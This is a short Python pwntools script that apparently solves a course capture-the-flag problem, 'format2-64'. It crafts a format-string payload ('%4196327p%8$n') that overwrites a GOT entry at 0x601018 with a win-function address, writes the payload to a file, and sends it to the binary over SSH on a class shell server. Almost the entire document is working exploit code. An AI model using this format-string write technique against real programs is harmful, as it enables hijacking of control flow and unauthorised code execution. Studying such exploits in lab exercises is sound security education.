# format2ex.py - Aidan Wech (Onyxymous)
# /problems/format2r-64_3_55908c801d6a6c58b474988e3a32b6d1/
from pwn import *

# debug info
bin64 = './format2-64'
elf = ELF(bin64)
context.binary = elf
context.log_level = 'debug'

# ssh variables
name = 'ahwech'
host = 'cs4401shell.walls.ninja'
keyfile = '../../onyx_ssh_key'
d = '/problems/format2r-64_3_55908c801d6a6c58b474988e3a32b6d1/'

# exploit variables
buffarg = 6
retarg = 8
offset = (8 * (retarg - buffarg))
winaddr = 0x400737			# in decimal, this is 4196327
retaddr = 0x601018

# exploit string
exploit = flat({
0: '%4196327p%8$n',
offset: p64(retaddr)})

f = open('payload', 'wb')
f.write(exploit)
f.close()

# ssh process
s = ssh(name, host, keyfile=keyfile)
s.set_working_directory(d)
p = s.process(bin64)

p.recvline(timeout=1)
p.sendline(exploit)
print(p.recvall(timeout=1))
